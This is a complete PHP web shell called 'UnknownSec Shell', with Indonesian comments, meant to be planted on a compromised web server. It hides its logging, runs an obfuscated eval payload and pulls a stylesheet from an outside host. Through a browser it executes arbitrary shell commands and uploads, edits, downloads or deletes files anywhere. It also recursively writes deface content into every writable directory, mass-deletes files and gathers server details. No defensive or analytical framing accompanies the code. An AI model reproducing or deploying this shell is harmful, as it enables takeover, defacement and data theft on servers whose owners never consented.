<?php
/* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta'); 
$_n = 'UnknownSec';
$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
$_r = "required='required'";
$_x = "<i class='bi bi-gear-fill'></i>"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path'])); 
exit();
}
function ▟($dir,$p) {
if(isset($_GET['path'])) {
	$▚ = $_GET['path'];
} else {
	$▚ = getcwd();
}
if(is_writable($▚)) {
	return "<gr>".$p."</gr>";
} else {
	return "<rd>".$p."</rd>";
	}
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$sz = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$sz[$i]);
}
function ip() {
	$ipas = '';
if(getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}
function p($file){
if($p = @fileperms($file)){
	$i = 'u';
if(($p & 0xC000) == 0xC000)$i = 's';
elseif(($p & 0xA000) == 0xA000)$i = 'l';
elseif(($p & 0x8000) == 0x8000)$i = '-';
elseif(($p & 0x6000) == 0x6000)$i = 'b';
elseif(($p & 0x4000) == 0x4000)$i = 'd';
elseif(($p & 0x2000) == 0x2000)$i = 'c';
elseif(($p & 0x1000) == 0x1000)$i = 'p';
	$i .= ($p & 00400)? 'r':'-';
	$i .= ($p & 00200)? 'w':'-';
	$i .= ($p & 00100)? 'x':'-';
	$i .= ($p & 00040)? 'r':'-';
	$i .= ($p & 00020)? 'w':'-';
	$i .= ($p & 00010)? 'x':'-';
	$i .= ($p & 00004)? 'r':'-';
	$i .= ($p & 00002)? 'w':'-';
	$i .= ($p & 00001)? 'x':'-';
return $i;
	}
	else return "- ?? -";
}
echo "
<!DOCTYPE HTML>
<html>
	<head>
		<meta name='author' content='$_n'>
		<meta name='robots' content='noindex,nofollow'>
		<title>".$_SERVER['HTTP_HOST']." - $_n</title>
		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
		<link rel='stylesheet' href='//random-php.ftp.sh/style.css'>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
	</head>
<style>
.shell {
	border-radius: 4px;
	border: 1px solid rgba(255, 255, 255, 0.4);
	font-size: 10pt;
	display: flex;
	flex-direction: column;
	align-items: stretch;
	background: #242424;
	color: #fff;
}
.pre {
	height: 500px;
	overflow: auto;
	white-space: pre-wrap;
	flex-grow: 1;
	margin:10px auto;
	padding:10px;
	line-height:1.3em;
	overflow-x:scroll;
}
</style>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary'>shell bypass 403</div>
				<a class='text-decoration-none text-light' href='".$_SERVER['PHP_SELF']."'><h4>$_n Shell</h4></a>";
				if(isset($_GET['path'])){
					$path = $_GET['path'];
				} else {
					$path = getcwd();
				}
					$path = str_replace('\\','/',$path);
					$paths = explode('/',$path);
				foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
					$a = true;
					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
					echo '<a class="text-decoration-none" href="?path=';
				for($i=0;$i<=$id;$i++){
					echo "$paths[$i]";
				if($i != $id) echo "/";
				}
				echo '">'.$pat.'</a>/';
				}
				echo " [ ".▟($path, p($path))." ]</div>";
			echo "
		</div>
	</div>
</div>
<div class='container-fluid'>
	<div class='box shadow bg-dark p-4 rounded-3'>
		<div class='text-center'>
			<a class='btn btn-outline-light btn-sm' href='?id=upload&path=$path'><i class='bi bi-upload'></i> upload</a>
			<a class='btn btn-outline-light btn-sm' href='?id=deface&path=$path'><i class='bi bi-exclamation-diamond'></i> mass deface</a>
			<a class='btn btn-outline-light btn-sm' href='?id=delete&path=$path'><i class='bi bi-trash'></i> mass delete</a>
			<a class='btn btn-outline-light btn-sm' href='?id=cmd&path=$path'><i class='bi bi-terminal'></i> console</a>
			<a class='btn btn-outline-light btn-sm' href='?id=info&path=$path'><i class='bi bi-info-circle'></i> info server</a>
		</div>";
// tools nya
if(isset($_GET['path'])) {
	$dir = $_GET['path'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
} elseif($_GET['id'] == 'deface'){
echo "$_s";
function mass_kabeh($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			file_put_contents($▚, $isi_script);
		} elseif($dirb === '..') {
			file_put_contents($▚, $isi_script);
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
					file_put_contents($▚, $isi_script);
					$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	} elseif($_POST['tipe'] == 'biasa') {
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	}
	echo "<br>";
}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form method='POST'>
		<kbd>$_x&nbsp;Mass deface</kbd>
		<br>Tipe:<br>
		<div class='custom-control custom-switch'>
			<input class='custom-control-input' type='checkbox' id='customSwitch' name='tipe' value='biasa'>
			<label class='custom-control-label' for='customSwitch'>Biasa</label>
		</div>
		<div class='custom-control custom-switch'>
			<input class='custom-control-input' type='checkbox' id='customSwitch1' name='tipe' value='massal'>
			<label class='custom-control-label' for='customSwitch1'>Massal</label>
		</div>
			<i class='bi bi-folder'></i> Lokasi:
			<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
			<i class='bi bi-file-earmark'></i> Nama file:
			<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r>
			<i class='bi bi-file-earmark'></i> Isi file:
			<textarea class='form-control btn-sm' rows='7' name='script' placeholder='isi file' $_r></textarea>
			<input class='btn btn-dark btn-sm btn-block' type='submit' name='start' value='mass deface'>
		</form>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'cmd'){
if($_POST['ekseCMD']) {
$cmd = $_POST['ekseCMD'];
}
echo "$_s
<div class='card text-dark'>
	<div class='card-header'>
	<kbd>$_x&nbsp;Console</kbd>
		<div class='container-fluid language-javascript'>
			<pre style='font-size:10px;'><gr>~</gr>$&nbsp;<rd>$cmd</rd><br><code>"; system($_POST['ekseCMD'].' 2>&1'); echo "</code></pre>
		</div>
		<form method='POST'>
			<div class='input-group mb-3'>
				<input class='form-control btn-sm' type='text' name='ekseCMD' value='$cmd' placeholder='whoami' $_r>
				<button class='btn btn-dark btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'info'){
$disfunc = @ini_get("disable_functions");
if(empty($disfunc)) {
	$disfc = "<gr>NONE</gr>";
} else {
	$disfc = "<rd>$disfunc</rd>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
echo "$_s
<div class='card text-dark'>
	<div class='card-header'>
	<kbd>$_x&nbsp;Info server</kbd>
		<br>
		Uname: <gr>".php_uname()."</gr><br />
		Software: <gr>".$_SERVER['SERVER_SOFTWARE']."</gr><br />
		PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?id=phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
		Server Ip: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br />
		Your Ip: <gr>".ip()."</gr><br />
		User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br />
		Safe Mode: $sm<br />
		<kbd>Disable Function:</kbd><pre>$disfc</pre>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'phpinfo'){
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<pre class='php_info'>".substr($buff,$awal,$akhir-$awal)."</pre>";
	exit;
} elseif($_GET['id'] == 'upload'){
echo "$_s
<div class='card text-dark'>
	<div class='card-header'>";
if(isset($_FILES['file'])){
	if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
		echo '<strong>Upload</strong> ok! '.ok().'</div>';
		} else {
		echo '<strong>Upload</strong> gagal! '.er().'</div>';
		}
	}
echo "
		<form method='POST' enctype='multipart/form-data'>
			<kbd>$_x&nbsp;Upload File</kbd>
			<div class='input-group mb-3'>
				<input class='form-control form-control-sm' type='file' name='file' $_r>
				<button class='btn btn-dark btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
			</div>
		</form>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'filebaru') {
echo "$_s";
if(isset($_POST['bikin'])){
	$name = $_POST['nama_file'];
	$isi_file = $_POST['isi_file'];
	foreach ($name as $nama_file){
		$handle = @fopen("$nama_file", "w");
		if($isi_file){
			$buat = @fwrite($handle, $isi_file);
		} else {
			$buat = $handle;
		}
	}
	if($buat){
		echo '<strong>Buat file</strong> ok! '.ok().'</div>';
	} else {
		echo '<strong>Buat file</strong> gagal! '.er().'</div>';
		}
	}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<kbd>$_x&nbsp;Buat file</kbd>
		<form method='POST'>
			<i class='bi bi-file-earmark'></i> Nama file:
			<input class='form-control form-control-sm' type='text' name='nama_file[]' placeholder='Nama file' $_r>
			<i class='bi bi-file-earmark'></i> Isi file:
			<textarea class='form-control form-control-sm' name='isi_file' rows='7' placeholder='Isi file' $_r ></textarea>
			<input class='btn btn-dark btn-sm btn-block' type='submit' name='bikin' value='buat'>
		</form>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'dirbaru'){
echo "$_s";
if(isset($_POST['buat'])){
	$nama = $_POST['nama_dir'];
	foreach ($nama as $nama_dir){
		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_dir);
		$fd = @mkdir ($folder);
	}
	if($fd){
		echo '<strong>Buat dir</strong> ok! '.ok().'</div>';
	} else {
		echo '<strong>Buat dir</strong> gagal! '.er().'</div>';
		}
	}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<kbd>$_x&nbsp;Buat dir</kbd>
		<form method='POST'>
			<i class='bi bi-folder'></i> Nama dir:
			<div class='input-group mb-3'>
				<input class='form-control form-control-sm' type='text' name='nama_dir[]' placeholder='Nama dir' $_r>
				<input class='btn btn-dark btn-sm' type='submit' name='buat' value='buat'>
			</div>
		</form>
	</div>
</div>
<br>";
} elseif($_GET['id'] == 'delete'){
echo "$_s";
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			if(file_exists("$dir/$namafile")) {
				unlink("$dir/$namafile");
			}
		} elseif($dirb === '..') {
			if(file_exists("".dirname($dir)."/$namafile")) {
				unlink("".dirname($dir)."/$namafile");
			}
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					if(file_exists($▚)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
						unlink($▚);
						$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
	echo "<br>";
}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form method='POST'>
		<kbd>$_x&nbsp;Mass delete</kbd>
		<br>
		<i class='bi bi-folder'></i> Lokasi:
			<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Nama file:
			<div class='input-group mb-3'>
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r><br>
			<div class='input-group-append'>
				<input class='btn btn-dark btn-sm' type='submit' name='start' value='mass delete'>
			</div>
		</form>
		</div>
	</div>
</div>
<br>";
	}
}
// akhir tools
if(isset($_GET['filesrc'])){
echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
echo '<div class="shell pre" id="see"><pre style="font-size:10px;">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre></div><br/>';
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
//rename file
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<strong>Rename</strong> ok! '.ok().'</div>';
	} else {
echo '<strong>Rename</strong> gagal! '.er().'</div>';
}
$_POST['name'] = $_POST['newname'];
}
echo '
<form method="POST">
	<div class="input-group mb-3">
		<input class="form-control form-control-sm" name="newname" type="text" value="'.$_POST['name'].'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="rename">
		<input class="btn btn-outline-light btn-sm" type="submit" value="rename"/>
	</div>
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<strong>Edit</strong> ok! '.ok().'</div>';
	} else {
echo '<strong>Edit</strong> gagal! '.er().'</div>';
}
fclose($fp);
}
echo '
<form method="POST">
	<textarea class="form-control form-control-sm" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="edit">
	<input class="btn btn-outline-light btn-sm btn-block" type="submit" value="edit"/>
</form>
<br>';
	}
} else {
//delete dir & file
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
	echo '<strong>Delete dir</strong> ok! '.ok().'</div>';
	} else {
	echo '<strong>Delete dir</strong> gagal! '.er().'</div>';
	}
} elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
	echo '<strong>Delete file</strong> ok! '.ok().'</div>';
	} else {
	echo '<strong>Delete file</strong> gagal! '.er().'</div>';
		}
	}
}
$scandir = scandir($path);
$pa = getcwd();
echo '<div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
	<td class="text-center">name</td>
		<td class="text-center">last edit</td>
		<td class="text-center">size</td>
		<td class="text-center">owner<gr>:</gr>downer</td>
		<td class="text-center">permission</td>
	<td class="text-center">options</td>
</tr>
</thead>
<tbody class="text-nowrap">
<tr>
	<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
		<div class="btn-group">
			<a class="btn btn-outline-light btn-sm" href="?id=filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
			<a class="btn btn-outline-light btn-sm" href="?id=dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
		</div>
	</td>
</tr>';
foreach($scandir as $dir){
$dt = date("Y-m-d H:i:s", filemtime("$path/$dir"));
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	} else {
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup("$path/$dir");
	}
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href=\"?path=$path/$dir\">$dir</a></td>
	<td class='text-center'>$dt</td>
	<td class='text-center'>dir</td>
	<td class='text-center'>$downer<gr>:</gr>$dgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$dir")) echo '<gr>';
elseif(!is_readable("$path/$dir")) echo '<rd>';
echo p("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
	<form method=\"POST\" action=\"?option&path=$path\">
		<div class=\"btn-group\">
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"rename\"><i class='bi bi-pencil-fill'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"delete\"><i class='bi bi-trash-fill'></i></button>
		</div>
		<input type=\"hidden\" name=\"type\" value=\"dir\">
		<input type=\"hidden\" name=\"name\" value=\"$dir\">
		<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
	</form>
	</td>
</tr>";
}
foreach($scandir as $file){
$ft = date("Y-m-d H:i:s", filemtime("$path/$file"));
	if(!is_file($path.'/'.$file)) continue;
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	} else {
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	} else {
		$fgrp = filegroup("$path/$file");
	}
echo "
<tr>
	<td><i class='bi bi-file-earmark-code-fill'></i><a class='text-decoration-none text-secondary' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
	<td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner<gr>:</gr>$fgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$file")) echo '<gr>';
elseif(!is_readable("$path/$file")) echo '<rd>';
echo p("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
		<form method=\"POST\" action=\"?option&path=$path\">
			<div class=\"btn-group\">
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"rename\"><i class='bi bi-pencil-fill'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"delete\"><i class='bi bi-trash-fill'></i></button>
			</div>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
		</form>
	</td>
</tr>";
	}
}
echo "
</tbody>
</table>
<div class='text-secondary'>&copy; ".date("Y")." $_n</div>
</div>
</div>
</body>
</html>";
?>
